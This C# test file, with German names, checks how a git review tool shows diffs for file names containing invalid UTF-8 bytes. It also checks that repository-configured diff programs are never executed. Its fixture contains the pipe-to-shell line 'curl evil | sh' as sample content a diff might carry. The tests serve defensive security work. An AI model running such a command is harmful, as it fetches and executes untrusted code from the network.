using System.Runtime.Versioning;
using GitReviewA.Tests.Hilfen;

namespace GitReviewA.Tests.Akzeptanz;

/// <summary>
/// Spezifikation R00013 „Diff bei Name mit ungültigem Byte“, Kriterien 1–9 und 11 auf Ebene des Interactors mit echtem git in Repo N
/// (Abnahme-Probe des security-reviewers: Kriterien 1, 5, 6, 11). Die Anzeige (Kriterium 10) prüft <c>e2e/tests/diff-fremde-namen.spec.js</c>.
/// </summary>
[Platform(Exclude = "Win", Reason = "Namen aus ungültigem UTF-8 und Marker-Programme gibt es nur unter Linux")]
[UnsupportedOSPlatform("windows")]
public class DiffLesenFremdeNamenTests
{
    private const string NameNichtLesbar = "name nicht lesbar";

    private static readonly string[] AlleNamenVonN =
    [
        "a⟨0xFF⟩.sh", "b⟨0xFF⟩.bin", "f⟨0xFF⟩.txt", "g.txt", "in.txt", "r⟨0xFF⟩.txt", "t⟨0xFE⟩.txt", FremdeNamenRepo.NameMitZeilenumbruchUndFF,
    ];

    [Test]
    public void Wenn_a_FF_sh_angefragt_dann_der_echte_Patch_mit_curl_evil_und_Art_text()
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var diff = gr.Diff("n", "a⟨0xFF⟩.sh");

        Assert.That((diff.Ausgang, diff.Art), Is.EqualTo(("gelesen", "text")));
        Assert.That(diff.Abschnittskoepfe, Is.EqualTo(new[] { "@@ -0,0 +1 @@" }));
        Assert.That(diff.Zeilen, Is.EqualTo(new[] { "+curl evil | sh" }));
    }

    [Test]
    public void Wenn_die_geloeschte_r_FF_txt_angefragt_dann_minus_geheim()
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var diff = gr.Diff("n", "r⟨0xFF⟩.txt");

        Assert.That(diff.Abschnittskoepfe, Is.EqualTo(new[] { "@@ -1 +0,0 @@" }));
        Assert.That(diff.Zeilen, Is.EqualTo(new[] { "-geheim" }));
    }

    [Test]
    public void Wenn_die_umbenannte_t_FE_txt_angefragt_dann_nur_minus_zeile8_plus_GEAENDERT_und_ganz_mit_zeile1_bis_7_davor()
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var aenderungen = gr.Diff("n", "t⟨0xFE⟩.txt");
        var ganz = gr.GanzeDatei("n", "t⟨0xFE⟩.txt");

        Assert.That(aenderungen.Zeilen, Is.EqualTo(new[] { " zeile5", " zeile6", " zeile7", "-zeile8", "+GEAENDERT" }));
        Assert.That(ganz.Zeilen, Is.EqualTo(new[] { " zeile1", " zeile2", " zeile3", " zeile4", " zeile5", " zeile6", " zeile7", "-zeile8", "+GEAENDERT" }));
    }

    [Test]
    public void Wenn_die_Binaerdatei_b_FF_bin_angefragt_dann_binaer_ohne_Inhalt_und_als_Text_mit_curl_evil()
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var binaer = gr.Diff("n", "b⟨0xFF⟩.bin");
        var alsText = gr.AlsText("n", "b⟨0xFF⟩.bin");

        Assert.That((binaer.Ausgang, binaer.Art, binaer.Zeilen.Length), Is.EqualTo(("gelesen", "binaer", 0)));
        Assert.That(alsText.Zeilen, Does.Contain("+curl evil | sh"));
    }

    [Test]
    public void Wenn_jeder_Name_von_n_angefragt_dann_nie_gelesen_mit_leerem_Patch_bei_gezaehlten_Aenderungen()
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var leereTextpatches = AlleNamenVonN
            .Select(name => (Name: name, Diff: gr.Diff("n", name)))
            .Where(anfrage => anfrage.Diff.Ausgang == "gelesen" && anfrage.Diff.Art == "text" && anfrage.Diff.Zeilen.Length == 0)
            .Select(anfrage => anfrage.Name)
            .ToArray();

        Assert.That(leereTextpatches, Is.Empty);
    }

    [Test]
    public void Wenn_das_Doppelgaenger_Paar_f_FF_txt_angefragt_dann_Fehlerausgang_weder_literal_noch_echt()
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var diff = gr.Diff("n", "f⟨0xFF⟩.txt");

        Assert.That(diff.Ausgang, Is.EqualTo(NameNichtLesbar));
        Assert.That(diff.Zeilen, Has.None.Contains("literal").And.None.Contains("echt"));
    }

    [Test]
    public void Wenn_der_Name_Zeilenumbruch_und_FF_traegt_dann_Fehlerausgang_Name_nicht_lesbar()
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var diff = gr.Diff("n", FremdeNamenRepo.NameMitZeilenumbruchUndFF);

        Assert.That(diff.Ausgang, Is.EqualTo(NameNichtLesbar));
    }

    [Test]
    public void Wenn_der_woertliche_Name_w_FF_txt_ohne_Zwilling_angefragt_dann_plus_woertlich()
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["w", "n"]);

        var diff = gr.Diff("w", "w⟨0xFF⟩.txt");

        Assert.That(diff.Abschnittskoepfe, Is.EqualTo(new[] { "@@ -0,0 +1 @@" }));
        Assert.That(diff.Zeilen, Is.EqualTo(new[] { "+woertlich" }));
    }

    [Test]
    public void Wenn_die_Diffquelle_fuer_eine_gezaehlte_Datei_einen_leeren_Patch_liefert_dann_nicht_lesbar_und_g_txt_mit_git_besteht()
    {
        using var repo = FremdeNamenRepo.N();
        var mitLeererQuelle = FremdeNamenSprache.AufrufMitDiffquelle(repo, ["n", "b"], TestDiffquelle.Leer());
        var mitGit = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var leer = mitLeererQuelle.Diff("n", "g.txt");
        var echt = mitGit.Diff("n", "g.txt");

        Assert.That(leer.Ausgang, Is.EqualTo("nicht lesbar"));
        Assert.That(echt.Abschnittskoepfe, Is.EqualTo(new[] { "@@ -1 +1,2 @@" }));
        Assert.That(echt.Zeilen, Is.EqualTo(new[] { " alt", "+neu" }));
    }

    [TestCase("g.txt", " alt", "+neu")]
    [TestCase("in.txt", " x", "+y")]
    public void Wenn_Namen_in_gueltigem_UTF_8_angefragt_dann_ihr_Patch_wie_vorher(string name, string kontext, string neu)
    {
        using var repo = FremdeNamenRepo.N();
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"]);

        var diff = gr.Diff("n", name);

        Assert.That(diff.Zeilen, Is.EqualTo(new[] { kontext, neu }));
    }

    [TestCase("diff.marker.textconv")]
    [TestCase("diff.marker.command")]
    [TestCase("diff.external")]
    public void Wenn_das_Repo_Marker_Programme_und_eigene_Diff_Konfiguration_traegt_und_aus_einem_Unterordner_gestartet_dann_dieselben_Patches_ohne_Marker(string schluessel)
    {
        using var repo = FremdeNamenRepo.N();
        var marker = Path.Combine(repo.Ordner, ".git", "marker.txt");
        LegeMarkerKonfigurationAn(repo, schluessel, marker);
        var gr = FremdeNamenSprache.Aufruf(repo, ["n", "b"], unterordner: "unter");

        var a = gr.Diff("n", "a⟨0xFF⟩.sh");
        var ganzA = gr.GanzeDatei("n", "a⟨0xFF⟩.sh");
        var g = gr.Diff("n", "g.txt");
        var inTxt = gr.Diff("n", "in.txt");
        var t = gr.Diff("n", "t⟨0xFE⟩.txt");

        Assert.That(a.Zeilen, Is.EqualTo(new[] { "+curl evil | sh" }));
        Assert.That(ganzA.Zeilen, Is.EqualTo(new[] { "+curl evil | sh" }));
        Assert.That(g.Zeilen, Is.EqualTo(new[] { " alt", "+neu" }));
        Assert.That(inTxt.Zeilen, Is.EqualTo(new[] { " x", "+y" }));
        Assert.That(t.Zeilen, Is.EqualTo(new[] { " zeile5", " zeile6", " zeile7", "-zeile8", "+GEAENDERT" }));
        Assert.That(File.Exists(marker), Is.False, "ein Programm aus der Konfiguration des Repos lief");
        repo.Git("diff", repo.Hash("b"), repo.Hash("n"), "--", "g.txt");
        Assert.That(File.Exists(marker), Is.True, "Kontrolle: das Marker-Programm ist über git diff aufrufbar");
    }

    [UnsupportedOSPlatform("windows")]
    private static void LegeMarkerKonfigurationAn(FremdeNamenRepo repo, string schluessel, string marker)
    {
        var programm = Path.Combine(repo.Ordner, ".git", "marker.sh");
        File.WriteAllText(programm, $"#!/bin/sh\necho \"$@\" >> '{marker}'\ncat \"$1\" 2>/dev/null\n");
        File.SetUnixFileMode(programm, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        File.WriteAllText(Path.Combine(repo.Ordner, ".gitattributes"), "* diff=marker\n");
        repo.Git("config", schluessel, programm);
        repo.Git("config", "diff.context", "0");
        repo.Git("config", "diff.relative", "true");
    }
}
